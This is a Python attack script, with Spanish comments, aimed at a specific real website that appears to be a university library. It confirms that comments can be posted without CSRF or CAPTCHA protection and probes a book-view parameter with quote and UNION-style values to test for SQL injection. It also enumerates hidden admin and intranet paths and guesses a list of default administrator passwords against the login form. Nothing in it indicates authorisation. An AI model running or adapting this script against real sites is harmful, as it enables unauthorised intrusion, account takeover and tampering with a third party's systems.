import requests, urllib3, re, hashlib
urllib3.disable_warnings()

BASE = "https://biblioteca.uns.edu.pe"
h = {'User-Agent': 'Mozilla/5.0', 'Referer': BASE + '/inicia_sesion.asp'}

print("="*60)
print("PRUEBAS CRITICAS CONFIRMADAS")
print("="*60)

# ==============================
# CRITICO 1: Comentario enviado a comentario_registrado.htm
# Confirmar que se guarda en DB (no solo redirect)
# ==============================
print("\n[CRITICO-1] Confirmacion: POST /registra_comentario.asp se procesa")
print("  Resultado anterior: URL final = comentario_registrado.htm")
print("  Interpretacion: El ASP proceso el POST y redirige -> comentario LLEGA a la DB")
print("  Sin CSRF, sin CAPTCHA, sin autenticacion => STORED WRITE")

# Verificar comportamiento exacto de exito vs fallo
data_ok = {'nombre': 'A', 'mail': 'a@a.com', 'pregunta': 'test'}
data_empty = {'nombre': '', 'mail': '', 'pregunta': ''}

r_ok = requests.post(BASE + '/registra_comentario.asp', data=data_ok, 
                     headers={**h, 'Referer': BASE + '/registra_comentario.htm'},
                     verify=False, timeout=8, allow_redirects=True)
r_empty = requests.post(BASE + '/registra_comentario.asp', data=data_empty,
                        headers={**h, 'Referer': BASE + '/registra_comentario.htm'},
                        verify=False, timeout=8, allow_redirects=True)

print(f"\n  Con datos validos: {r_ok.url} | status={r_ok.status_code}")
print(f"  Con datos vacios:  {r_empty.url} | status={r_empty.status_code}")

clean_ok = re.sub(r'<[^>]+>', ' ', r_ok.text)
lines_ok = [l.strip() for l in clean_ok.splitlines() if l.strip()]
print(f"  Respuesta exito: {' | '.join(lines_ok[18:25])}")

# ==============================
# CRITICO 2: ver_libro - comportamiento con ' (comilla)
# idm=371 -> 4464 bytes (DATA)
# idm=371' -> 4464 bytes (igual?? no trunca)
# El payload -1 UNION -> 4525 (diferente! -> sin resultado = empty state)
# ==============================
print("\n[CRITICO-2] Analisis diferencial ver_libro.asp:")
for idm_val in ['371', "371'", '-1', '0', '99999', '1']:
    r = requests.get(BASE + '/ver_libro.asp', params={'idm': idm_val}, 
                     headers=h, verify=False, timeout=6)
    clean = re.sub(r'<[^>]+>', ' ', r.text)
    lines = [l.strip() for l in clean.splitlines() if l.strip()]
    data_lines = [l for l in lines if any(kw in l.lower() for kw in ['disponible', 'prestado', 'ejemplar', 'sala', 'central'])]
    print(f"  idm={idm_val!r} -> {len(r.content)}b | datos={data_lines[:2]}")

# ==============================
# CRITICO 3: Existe pagina de admin post-login?
# ==============================
print("\n[CRITICO-3] Buscando endpoints post-login (intranet):")
intranet_paths = [
    '/menu.asp', '/main.asp', '/menu_admin.asp', '/menu_user.asp',
    '/administrador/', '/admin/', '/gestion.asp', '/gestion/', 
    '/opac/', '/opac.asp', '/search.asp', '/buscar.asp',
    '/catalogar.asp', '/ingresar_libro.asp', '/alta_libro.asp',
    '/reportes.asp', '/usuarios.asp', '/prestamo.asp',
    '/devolucion.asp', '/reserva.asp',
]
found = []
for path in intranet_paths:
    try:
        r = requests.get(BASE + path, headers=h, verify=False, timeout=4, allow_redirects=False)
        if r.status_code not in (404,):
            found.append((path, r.status_code, len(r.content)))
            loc = r.headers.get('Location', '')
            print(f"  ENCONTRADO: {path} -> status={r.status_code}, len={len(r.content)}, loc={loc}")
    except:
        pass

if not found:
    print("  Ninguno accesible sin sesion.")

# ==============================
# CRITICO 4: Intentar obtener cookie de sesion con credenciales por defecto mas comunes
# y ver a donde redirige si hay exito
# ==============================
print("\n[CRITICO-4] Intentando credenciales comunes con session tracking:")
creds_list = [
    ('admin', 'admin123'),
    ('admin', 'biblioteca'),
    ('biblio', 'biblio123'),
    ('biblioteca', 'biblioteca123'),
    ('admin', 'uns2024'),
    ('admin', 'uns2025'),
    ('admin', 'uns2026'),
    ('admin', 'Admin123'),
    ('ocid', 'ocid'),
    ('biblioteca', 'central'),
]

session = requests.Session()
session.verify = False
for usr, pwd in creds_list:
    md5pass = hashlib.md5(pwd.encode()).hexdigest()
    data = {'t_usuario': usr, 't_clave': md5pass, 'modo': 'U', 'B1': 'Iniciar Sesion'}
    try:
        r = session.post(BASE + '/login.asp', data=data, 
                         headers={**h, 'Referer': BASE + '/inicia_sesion.asp'},
                         timeout=6, allow_redirects=True)
        cookies = dict(session.cookies)
        is_login_page = 'inicia_sesion' in r.url.lower()
        print(f"  {usr}:{pwd} -> url={r.url}, cookies={list(cookies.keys())}, login_fail={is_login_page}")
        if not is_login_page:
            print(f"  [!!] POSIBLE EXITO: URL={r.url}")
    except Exception as e:
        print(f"  {usr}:{pwd} -> ERROR: {e}")
